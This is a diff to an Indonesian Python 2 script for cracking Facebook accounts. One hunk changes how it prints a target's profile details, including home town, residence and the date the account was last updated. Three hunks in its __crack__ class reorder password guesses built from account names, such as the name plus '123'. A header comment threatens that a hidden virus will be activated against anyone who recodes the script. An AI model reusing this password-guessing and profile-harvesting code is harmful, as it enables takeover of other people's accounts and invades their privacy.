@@ -4,8 +4,7 @@
 # my facebook ( https://www.facebook.com/KM39453 )
 
 # Jangan di recode bro ada virus yang tersembunyi. jika anda ketahuan merecode ulang
-# maka tidak akan segan" untuk menghidupkan virusnya..
-
+# ketahuan sama saya, maka tidak akan segan" untuk menghidupkan virusnya..
 import os
 try:
     import requests
@@ -511,11 +510,6 @@ def cek_ingfo():
     	dari = '%s-%s'%(M,N)
     except: pass
     try:
-    	uptd = x['updated_time']
-    except (KeyError, IOError):
-    	uptd = '%s-%s'%(M,N)
-    except:pass
-    try:
     	lins = x['link']
     except (KeyError, IOError):
     	lins = '%s-%s'%(M,N)
@@ -566,7 +560,16 @@ def cek_ingfo():
     print ' [*] kota asal      : %s'%(dari);time.sleep(0.03)
     print ' [*] tinggal di     : %s'%(tigl);time.sleep(0.03)
     print ' [*] zona waktu     : %s'%(tzim);time.sleep(0.03)
-    print ' [*] terakhir di updated pada : %s '%(uptd[:10]);time.sleep(0.03)
+    try:
+    	uptd = x['updated_time'][:10]
+        year, month, day = uptd.split("-")
+        month = bulan[month]
+    except (KeyError, IOError):
+    	year = ''
+        month = ''
+        day = ''
+    except:pass
+    print ' [*] terakhir di updated pada tanggal %s bulan %s tahun %s '%(day, month, year);time.sleep(0.03)
     print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m'
     jalan('\n [%s✓%s] berhasil mengechek data² akun facebook\n\n'%(O,N));exit()
 
@@ -924,8 +927,8 @@ class __crack__:
                         xz = bb[1].split(' ')
                         if len(xz) == 1:
                             raimuuu = [
-                                xz[0]+'123', xz[0]+'1234',
-                                xx[0], xz[0]+'12345',
+                                xx[0], xz[0]+'123', xz[0]+'1234',
+                                xz[0]+'12345',
                             ]
                         elif len(xz) == 2:
                             raimuuu = [
@@ -969,8 +972,8 @@ class __crack__:
                         xz = bb[1].split(' ')
                         if len(xz) == 1:
                             raimuuu = [
-                                xz[0]+'123', xz[0]+'1234',
-                                xx[0], xz[0]+'12345',
+                                xx[0], xz[0]+'123', xz[0]+'1234',
+                                xz[0]+'12345',
                             ]
                         elif len(xz) == 2:
                             raimuuu = [
@@ -1014,8 +1017,8 @@ class __crack__:
                         xz = bb[1].split(' ')
                         if len(xz) == 1:
                             raimuuu = [
-                                xz[0]+'123', xz[0]+'1234',
-                                xx[0], xz[0]+'12345',
+                                xx[0], xz[0]+'123', xz[0]+'1234',
+                                xz[0]+'12345',
                             ]
                         elif len(xz) == 2:
                             raimuuu = [
